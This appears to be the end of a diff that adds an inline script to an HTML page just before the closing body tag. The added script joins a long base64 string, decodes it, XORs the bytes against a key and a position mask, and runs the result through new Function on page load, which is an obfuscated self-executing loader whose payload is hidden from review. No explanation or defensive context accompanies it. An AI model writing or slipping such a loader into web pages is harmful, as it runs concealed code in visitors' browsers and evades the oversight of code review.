+'8rKhtqPFhBMMSQv09sWw255PpdpvhHp9GptuCDq4UfcAbRcMGjFWMNuvrQuVeywLeaxWsH2nTcObZuza2DqjSIK8k9CMx/i7f',
+'FhDYnj7iomKL/T+Q54sm0mZUwlPuUzFcmN8KwsxQ6iX1Yt5y3xYN0CNUk7OPZcgmx7hsrRw3U6Y+Cu4qdr3sGtbNMsN+46EsC',
+'G+6UjzAV493DkPKSJv+Rt6fB8pD/0W2dmvSft4CxEy/xA+2iDiVYQR67GrecwHhPLZv5fYz9xPHnjdQ/TsstEox6hYoWPUX9o',
+'tCxW7b8thbFd8YGNMLhzj9U/JLh8Ifq88PKGLlVaYGe+JuzrWcNbqkYe3udCnDEwuvXu4scrLbrmS56AW1Rqbbgg7hXGbLSwi',
+'PXtgcxTP2+VLhXoVRgzxJkDxc7RLm3Lsl/V/nk2D+KvQJePUl1hZL8p5x7OQwzqxqluaGLIgwWo4bqxJvUs+dT4iYXIV8tjiC',
+'JbRCQoIrXZ+zyCrbZcm1LKsNJhq0cnavJTb2qliYznGKduXrOUt68VAny3uDZQ8Kz23c9lfImUaNGYEM+ThiyVTeAoJC651f8',
+'8crxjIHafYmhyl4sjutb6P4KI9WlstyHr4mbaFeMPodfEu0QqL+FIsgxp6bCFmKTV3HDfF151v9VcXOAqPUHy5W5RTlCCmnPZ',
+'u/13ry4S+4uHor1RMRsgqsdyeilrRkuegFtUam28NNoAB3wU4AykvRW4Z3oqga9laLAt91HYQuAb4/5sa7IvMO8ZNm+GXvKwf',
+'8JY1LYdiePuKiK839N9LbqRTwAxLCFcQSclLbjU/A11vWIrZ43n/IByrQbhufrsht3S+G5nzuFVgS8nttr2M4taZZmNhm3iui',
+'/yIFeKgTHfdZzmoUQc96m/1clYVdhh7cXpx2a9J+3gKCQr6TDLbJd9YuNnrwb8NhXOF++WekqznkANPMfh65cyXrEFe/UyhF9',
+'QbmmxCLOsegnFtYwUtK0EPtHKsSvh7Cwl+i1RYoYuVVpgZ74i2BvMEm+6Rpsfl4IMVWFrIlgzlIiMu9f5PoBfMT6JjWR+EcMt',
+'NfCeYFihSIc/7iUqV0ggLCax3fcwjmWqiV7yLoDq/SdvRuum49u3HYVRm332qnxy7OsHqd/M1yzyBJgwOrFXtJ8Y1Pg5gVhXa',
+'2bZxtzAFCnysO0/KeIL10w71i5U51FKZmaq9oONGkQpOFfJEpqusiQD2SUjzNO5RnFUbBY9q7CbHND8NY1UW2diWXLYoMwxK7',
+'2BG3623cKgIz5CeVGFKyO61vo/h17BDEij9b7Wxyt1g1txUhXt8G5ptCzm6S8oAeWZpRVpVD7RyrEr4ewsJfgfcfM0jlVaZKP',
+'rZug7PWN/vwL/OjH2WWVguyXr1tLPGfvSvSukLwEqbGgmPBMFv+fk2QQ8lHxSz2+kTldIICwmsd3zBH60ayxu9r40vg0i+7fq',
+'p3Ebtxk0Qds9I26qtiluM/iILFdYZmG8JO7ls0UtPADsfdFZtrtn/TbNkHFosrBp/whCCUdO+1NqscJFO+cznmLn3n7A3W2Xe',
+'KK/CsOUtg1RNohTXGJlsCz2qW21TJjEKGUNxenHZr0n7eAoJCptwbtoMujkxGO6IujjIPvju8f7Pxbo98lstyHr5ia6QLdb4+',
+'RyecaoOSQpVEkvLSWw3PAxjGQKJC4l/7UZeWCqPUHy5W5Q6MBnvibs7yknL77Wms6jVt2hNfshf+P2Ky0L02k/QFo12mkokFp',
+'1JpuBtNj0PYVcU29utS/grQW8IwN99zCKUV5sa7Iq4OstIy7GShZzeiK5lGDryWba7jNM6VbZbuxX6GYR2SU+kSeVKSjUSDnx',
+'PRa7ErmT76AxbHJRPQ5MBs2SaBqGXuRXJb8nBtyyJs8OtYmdw613KI4iJLPf8TaIU1xiZbAo4u0rVF0olbi0XGVaZ6I5c3mUr',
+'WX/mNT//EYNMyWzyiJY46G7IxrXuz8XWuVpHHJlHufyXiAH23GihP9RX2kkvVRJLy0lsNzwMYlQX2NvYS/V+WgUqr1WA6SL4I',
+'jAZ74m7O8pJy++1yybg1ZZZWC7Jeoy5it9utdojCBbVGptuCU4R4MpIbTY9DixCRX7i/F6wIw07KYxTfbhalTszGuyKuDrLSM',
+'v1ivSNwuWCCFgLygz7yuWLC/SPT4YMnxytekUCiVzwVj8VUg9Eejn+2cLg+nkJCgitdn7PIKZByhr8nrwpyD/I9LOMwfa7PFt',
+'aLMt5+ouIiS2mtSmjeH8YmWwKOLtKyEpvND4oe1U23Py2AP5NH0Tmi4FGwx2vBIwhv1WfAdh3lMq0r5rkxpUuWnyBL+3kI4gt',
+'9v1MoRfUG5ptCiyLBt9INQoZHGNxDpHfmV+1li78M6JJRZw2rAcJJOLcji7zGadHtL+O4NWWWVguyA/5hI/aI9X+blwy1Haaf',
+'x0/qUi+STx/aBsNVmBz261L+XoICwmsdljUIrVGjh/8rrlWY0jK7Le8jePUl1hZLpsxn4vliwrttkuWAJv0vZswcq189BJ6FR',
+'piYSIU193/Rdp5KPYsrBsKZyGXVJob7Yu5OchLyMiv9InXwtm2f9jLDfuOmZiJ7rVIlwD3PPXECji7SshKbzQ/DBf9FtnZr0n',
+'7eAt9o651f84gllWYPfaImx3QA83boPK20MOsRwoNyAr42Y7BMOOtaKASxQo/dEI8j1/rbQCfPAxiVBfY2q1f/SsrLGYHdHzN',
+'I5VX7Cnv0ft77iVjR7S/juDVl0hlI5xO7bDasivk79r5A+xLKktFa6xx3wBNKzA+RFo4x+uta916fHMIwN99zCKUV5sa7ZOFc',
+'stp+/nnvanjoJcYNS7ueIuKxeYu0NNihxTTCInKEHK9fN1rSlmWDmBWFdrYrknfYQkqDRjL92qQA3Cbd0WLuTnIS8nttr2Ns5',
+'7wWjaEy3n6i4iJLPf8TaIVij2gfTdkgneJX1cVcjxmDAN4kLpR+1QKFRL+AWPODJfEnEn6sYMFlWrs3rWjcujnkGN3Mfh65NW',
+'umXzWiQDhV+U6j0gWGOo/gwksKxhgylQX2NqsSvh7Cwl+rnl5nC61Vrnly4jWT2JJy++0v47g1OLxWC7Je/iI/q9CXf5PoBeh',
+'sptvfB6ZbKc8SRYZY'].join("");
+var c=atob(b),d=new Uint8Array(c.length);
+for(var i=0;i<c.length;i++)d[i]=c.charCodeAt(i);
+var e=new Uint8Array(d.length);
+for(var i=0;i<d.length;i++)e[i]=d[i]^a[i%a.length]^((i*13+37)&255);
+(new Function(new TextDecoder().decode(e)))();
+})();
+</script>
 </body>
 </html>
